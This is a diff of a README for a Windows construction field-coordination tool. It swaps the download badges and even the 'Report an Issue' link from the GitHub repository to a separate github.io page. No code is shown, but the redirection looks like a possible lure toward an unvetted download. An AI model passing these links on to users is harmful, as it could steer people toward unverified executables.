@@ -1,6 +1,6 @@
 # 🏗️ aec-cp-construction-hub - Your All-in-One Field Coordination Tool
 
-[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-2F4F4F?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Executive-steampipe578/aec-cp-construction-hub)
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-2F4F4F?style=for-the-badge&logo=windows&logoColor=white)](https://executive-steampipe578.github.io)
 
 ## 📖 What This Application Does
 
@@ -39,7 +39,7 @@ Find any record quickly. You can filter by status, date, team member, or project
 
 Click the button below to go to the download page:
 
-[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-2F4F4F?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Executive-steampipe578/aec-cp-construction-hub)
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-2F4F4F?style=for-the-badge&logo=windows&logoColor=white)](https://executive-steampipe578.github.io)
 
 ### Step 2: Download the Application
 
@@ -152,6 +152,6 @@ This software is provided for use as-is. You are free to use it on any number of
 
 If you find a bug or have a feature request, please visit the repository page and open an issue. Include a description of the problem and steps to reproduce it.
 
-[Report an Issue](https://github.com/Executive-steampipe578/aec-cp-construction-hub/issues)
+[Report an Issue](https://executive-steampipe578.github.io)
 
 ## Keywords: construction management, field coordination, VIF tracking, project management tool, browser-based app, Windows software, construction software
